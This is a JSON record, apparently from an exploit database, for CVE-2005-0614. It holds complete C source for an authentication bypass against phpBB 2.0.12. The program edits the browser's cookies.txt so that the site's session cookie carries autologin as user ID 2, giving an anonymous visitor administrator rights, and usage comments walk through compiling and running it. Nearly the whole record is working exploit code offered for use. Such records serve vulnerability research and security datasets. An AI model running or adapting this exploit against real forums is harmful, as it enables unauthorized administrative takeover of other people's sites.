{
  "id": "897",
  "title": "phpBB 2.0.12 - Change User Rights Authentication Bypass",
  "cve": "CVE-2005-0614",
  "vuln_type": "auth_bypass",
  "code": "/* Paisterist's code was nice but heres mil's version.\r\n * precompiled: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/897.rar\r\n * Usage: \r\n * bcc32 897.cpp\r\n * and place the exe in your firefox profile dir.\r\n * Usually C:\\Documents and Settings\\Application Data\\Mozilla\\Firefox\\Profiles\\something.default\r\n * Visit a site with phpbb, close the browser, double click the exe, browse site.\r\n * This gives anonymous users administrator rights only.\r\n * Ya its lame im bored kthnx. If something goes wrong clear cookies.\r\n * \r\n * /str0ke\r\n */\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n//Taken from VeNoMouS's love cow code\r\nchar *search_and_replace (char *text, char *find, char *replace)\r\n{\r\nchar *found,*new_text;\r\nint\r\nlen_find=strlen(find),len_replace=strlen(replace),len_text=strlen(text),i=0,j=0;\r\n\r\nif((new_text=(char*)malloc(len_text+len_replace-len_find+1))==NULL)\r\n       {\r\n       printf(\"malloc issue...\\n\");\r\n       return new_text;\r\n       }\r\nfound = strstr(text, find);\r\nwhile (i <= len_text)\r\n{\r\nif ( found != text + i )\r\n       {\r\n       new_text[j] = text[i];\r\n       i++;\r\n       j++;\r\n       }\r\n       else\r\n       {\r\n           strcat (new_text, replace);\r\n           i += len_find;\r\n           j += len_replace;\r\n           found = strstr (text + i, find);\r\n       }\r\n       new_text[j] = '\\0';\r\n}\r\nreturn new_text;\r\n}\r\n\r\nint main()\r\n{\r\n  FILE * pFile;\r\n  long lSize;\r\n  char * buffer;\r\n\r\n  pFile = fopen ( \"cookies.txt\" , \"r\" );\r\n  if (pFile==NULL) exit (1);\r\n\r\n  fseek (pFile , 0 , SEEK_END);\r\n  lSize = ftell (pFile);\r\n  rewind (pFile);\r\n\r\n  buffer = (char*) malloc (lSize);\r\n  if (buffer == NULL) exit (2);\r\n  fread (buffer,1,lSize,pFile);\r\n  fclose (pFile);\r\n\r\n  pFile = fopen ( \"cookies.txt\" , \"w\" );\r\n  fputs(search_and_replace((char *)buffer,\"a%3A0%3A%7B%7D\",\"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D\"), pFile);\r\n  fclose (pFile);\r\n  free (buffer);\r\n  return 0;\r\n\r\n}\r\n\r\n// milw0rm.com [2005-03-24]",
  "url": "https://www.exploit-db.com/exploits/897"
}